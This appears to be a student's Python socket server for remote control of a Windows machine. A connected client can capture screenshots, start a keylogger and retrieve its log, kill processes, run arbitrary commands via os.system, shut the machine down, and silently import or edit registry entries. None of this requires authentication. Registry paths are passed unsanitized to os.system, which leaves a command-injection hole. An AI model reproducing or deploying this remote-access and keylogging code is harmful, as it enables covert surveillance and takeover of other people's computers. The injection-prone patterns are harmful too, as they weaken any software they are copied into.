import sys
import socket
import threading
import time
from PIL import Image
import numpy as np
from ScreenShot import*
from RunningProccess import*
from KeyLogger import*
from ShutDown import*
from Registry import*

HEADER = 64
PORT = 5050
# SERVER = socket.gethostbyname(socket.gethostname())
SERVER = "127.0.0.1"
ADDR= (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "DISCONNECT!"
TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
RUNNING_PROCESS ="CHECK RUNNING PROCESS"
STOP_LISTING = "STOP"
START_LISTING = "START LISTING"
KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
KEYLOGGING ="KEY LOG"
STOP_KEYLOGGING = "STOP KEYLOGGING"
PRINT_KEYLOG = "PRINT KEYLOG"
SHUTDOWN = "SHUTDOWN"
CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
SEND_FILE = "SEND FILE"
SEND_REG_FILE = "SEND REG FILE"
CREATE_REG_KEY = "CREATE REG KEY"
GET_KEY_VALUE = "GET KEY VALUE"
ADD_NEW_KEY = "ADD NEW KEY"
DEL_KEY = "DELETE KEY"
START_PROCESS = "START PROCESS"

# C:\Users\MSI-NK\OneDrive\Máy tính\Code\DoAnSocket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def send1(conn,msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    conn.send(send_length)
    conn.send(message)

def recv1(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if msg_length:
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(FORMAT)
        return msg
    return ""

def get_Size(fileobject):
    fileobject.seek(0,2) # move the cursor to the end of the file
    size = fileobject.tell()
    return size

def send_file(conn, filename):
    file = open(filename,"rb")
    size = get_Size(file)
    size = str(size)
    print(size)
    file.close()
    # conn.send(size.encode(FORMAT))
    send1(conn,size)

    with open(filename, "rb") as fp:
        # i=0
        data = fp.read(1024)
        # print(f"{i}    {sys.getsizeof(data)}")
        while data:
            conn.send(data)
            # i += 1
            data = fp.read(1024)
            # print(f"{i}    {sys.getsizeof(data)}")


            if not data:
                break


def recv_file(conn, filename):
    size = recv1(conn)
    size = int(size)
    i = 0
    with open(filename,"wb") as file:
        while True:
            i +=1024
            byte_read = 1024
            
            data = conn.recv(byte_read)
            file.write(data)
            if i > size:
                break
            if size - i < 1024:
                byte_read = size - i

def send_img(conn,filename):
    im = Image.open(filename,'r')
    width,height = im.size
    pic_data = list(im.getdata())
    send1(conn,str(width))
    send1(conn,str(height))
    len =width*height
    for i in range(len):
        send1(conn,str(pic_data[i][0]))
        send1(conn,str(pic_data[i][1]))            
        send1(conn,str(pic_data[i][2]))            


    

def recv_img(conn,filename):
    width = recv1(conn)
    height = recv1(conn)
    width = int(width)
    height = int(height)
    pixels = list()
    for i in range(height):
        tmp = list()
        for j in range(width):
            r = int(recv1(conn))
            g = int(recv1(conn))
            b = int(recv1(conn))
            pxl =(r,g,b)
            tmp.append(pxl)
        pixels.append(tmp)
    array = np.array(pixels, dtype=np.uint8)
    new_img = Image.fromarray(array)
    new_img.save(filename)


def conn_recv_reg_file(conn):
    filename = conn.recv(1024).decode(FORMAT)
    if filename != "NO FILE SENT!": 
        with open(filename + "_from_client.reg","w") as file:
            content_length = conn.recv(HEADER).decode(FORMAT)
            if content_length:
                content_length = int(content_length)
                content = conn.recv(content_length).decode(FORMAT)
            file.write(content)
        os.system("regedit /s " + filename)
        return True
    return False





def handle_client(conn, addr):
    # print(f"[NEW CONNECTION] {addr} connected.")
   
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            print(f"[{addr}] {msg}") 
            # reply=""


            if msg == TAKE_SCREEN_SHOT:
                
                Take_Screenshot("ScreenShot.png")
                # send_file(conn,"ScreenShot.png")
                send_img(conn, "ScreenShot.png")
                    



            elif msg == RUNNING_PROCESS:
                obj = wmi.WMI()
                count = 0
                print("pid   Process name   ThreadCount")
                                
                for process in obj.Win32_Process():
                    print(f"{process.ProcessId:<10}\t{process.Name}\t{process.ThreadCount}")
                    send1(conn,f"{process.ProcessId:<10}\t{process.Name}\t{process.ThreadCount}")
                    count += 1
                send1(conn,STOP_LISTING +" "+ str(count))




            elif msg == KILL_PROCESS_VIA_PID:
                
                pid = recv1(conn)
                pid = int(pid)
                process_killed = kill_process_by_id(pid)

                if process_killed == True:
                    
                    send1(conn,"TRUE")
                else:
                    
                    send1(conn,"FALSE")

            

            elif msg == KILL_PROCESS_VIA_NAME:
                conn.send("Deleting process with process's name: ".encode(FORMAT))
                p_name = conn.recv(1024).decode(FORMAT)
                process_killed = kill_process_by_name(p_name)
                
            
            elif msg == START_PROCESS:
                proc = recv1(conn)
                os.system(proc)

                
            elif msg == KEYLOGGING:
                def init_listener():
                    with Listener(on_press = getKey) as listener:
                        listener.join()
                sidequest_thread = threading.Thread(target= init_listener)
                sidequest_thread.start()
            
            elif msg == STOP_KEYLOGGING:
                for i in range(10):
                    Key_press(Key.f12)
                
            
            elif msg == PRINT_KEYLOG:
                try:
                    # Key_press(Key.f12)
                    with open("KeyLog.txt","r") as file:
                        key_log_string=file.read()
                        
                    send1(conn,key_log_string)
                    
                except FileNotFoundError:
                    send1(conn,"File not found")


            elif msg == SHUTDOWN:
                conn.send("Input time remained until shutdown: ".encode(FORMAT))
                sec = conn.recv(1024).decode(FORMAT)
                # reply += f"SERVER WILL SHUTDOWN IN {sec} SECONDS"
                sec = int(sec)
                shutdown(sec)

            elif msg == CANCEL_SHUTDOWN:
                cancel_shutdown()
                # reply += "SHUTDOWN CANCELED"


            elif msg == SEND_REG_FILE:
                conn_recv_reg_file(conn)
                # if conn_recv_reg_file(conn):
                #     reply += "FILE RECEIVED"
                # else:
                #     reply += "NO FILE RECEIVED"

            elif msg == GET_KEY_VALUE:
                path = conn.recv(1024).decode(FORMAT)
                name = conn.recv(1024).decode(FORMAT)
                res = get_registry_value(path,name)
                # if res == "ERROR: INVALID PATH":
                #     reply = res
                # else :
                #     reply += path+ "   "+name+"    "+res

            elif msg == ADD_NEW_KEY:
                path = conn.recv(1024).decode(FORMAT)
                hkey, sub_key = getKeyFromPath(path)
                if hkey is None:
                    # reply += "ERROR: INVALID PATH"
                    pass
                else:
                    try:
                        os.system("reg add "+path)
                        # reply += "ADD REGISTRY KEY SUCCESSFULLY"
                    except :
                        # reply += "ERROR!"
                        pass

            elif msg == DEL_KEY:
                path = conn.recv(1024).decode(FORMAT)
                hkey, sub_key = getKeyFromPath(path)
                if hkey is None:
                    # reply += "ERROR: INVALID PATH"
                    pass
                else:
                    try:
                        os.system("reg delete "+path + " /f")
                        # reply += "DELETE REGISTRY KEY SUCCESSFULLY"
                    except :
                        # reply += "ERROR!"
                        pass


            elif msg == DISCONNECT_MESSAGE:
                # reply +="CONNECTION TERMINATED!"
                connected = False
            
            

            else:
                # reply += "MESSAGE RECEIVED."
                pass
            time.sleep(0.500)
            # conn.send(reply.encode(FORMAT))
            #print(f"[{addr}] {msg}")    
            
    conn.close()


def start():
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER}")
    conn, addr = server.accept()
    handle_client(conn,addr)
    print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")
    # while True:
    #     thread = threading.Thread(target = handle_client, args= (conn,addr))
    #     thread.start()


    
print("[STARTING] server is starting ...")
start()

# C:\Users\MSI-NK\OneDrive\Máy tính\Code\DoAnSocket